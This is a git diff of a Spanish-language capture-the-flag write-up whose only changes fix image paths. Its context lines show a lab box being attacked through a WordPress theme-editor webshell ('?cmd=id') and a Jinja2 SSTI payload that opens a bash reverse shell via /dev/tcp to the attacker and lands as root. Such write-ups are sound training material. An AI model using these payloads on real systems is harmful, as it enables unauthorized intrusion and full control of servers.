@@ -4,7 +4,7 @@ Propiedades:
 - Nivel: Easy
 - Tags: #wordpress #ssti #port-forwarding #bruteforce 
 
-![](../assets/Pasted%20image%2020251202160952.png)
+![](assets/Pasted%20image%2020251202160952.png)
 ## Reconocimiento
 
 Comienzo tirando un ping para comprobar conectividad:
@@ -57,7 +57,7 @@ Encontramos los siguientes puertos abiertos:
 
 - La pagina no contiene nada relevante, tampoco en su codigo fuente.
 
-![](../assets/Pasted%20image%2020251202161427.png)
+![](assets/Pasted%20image%2020251202161427.png)
 
 **Fuzzing**.
 
@@ -70,7 +70,7 @@ wp1                     [Status: 200, Size: 84437, Words: 2547, Lines: 851, Dura
 ```
 
 - wp1 al parecer  es un wordpress:
-![](../assets/Pasted%20image%2020251202162412.png)
+![](assets/Pasted%20image%2020251202162412.png)
 
 **Enumeracion del WordPress**
 
@@ -147,13 +147,13 @@ Dentro del wordpress me dirigo al apartado de editor de temas y edito un archivo
 
 - Actualizo y guardo el archivo.
 
-![](../assets/Pasted%20image%2020251202164151.png)
+![](assets/Pasted%20image%2020251202164151.png)
 
 Me dirigo a la ruta donde se guardan los temas por defecto. `http://thefirstavenger.thl/wp1/wp-content/themes/twentytwentytwo/?cmd=id`
 
 - Ejecuto el comando `id`
 
-![](../assets/Pasted%20image%2020251202164353.png)
+![](assets/Pasted%20image%2020251202164353.png)
 
 Ahora procedo a entablarme una reverse-shell:
 
@@ -371,7 +371,7 @@ Al acceder a la web podemos ver esto:
 
 - Es una pagina para realizar pings.
 
-![](../assets/Pasted%20image%2020251202172648.png)
+![](assets/Pasted%20image%2020251202172648.png)
 
 Enumeramos las tecnologías web de esta pagina para tener un poco mas de informacion.
 
@@ -385,7 +385,7 @@ http://localhost:8080 [200 OK] HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.12.3], 
 Python tiene frameworks como `Flask` o `Django` que usan sistemas de plantillas para crear webs. Por lo cual esto me hace pensar que puede que la web sea vulnerable a algun tipo de `SSTI` (Server Side Template Injection) esto lo podemos comprobar con una simple operatoria.
 
 - Nosotros realizamos la operatoria {{7x7}} para ver si la web la realiza de manera correcta. 
-![](../assets/Pasted%20image%2020251202172858.png)
+![](assets/Pasted%20image%2020251202172858.png)
 
 - Efectivamente la web realiza la operatorio y nos refleja el resultado `49` en el propio input
 
@@ -402,7 +402,7 @@ Ahora nosotros podemos establecernos una reverse-shell.
 {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"').read() }}
 ```
 
-![](../assets/Pasted%20image%2020251202173352.png)
+![](assets/Pasted%20image%2020251202173352.png)
 
 
 - Recibimos la conexión y somos root.
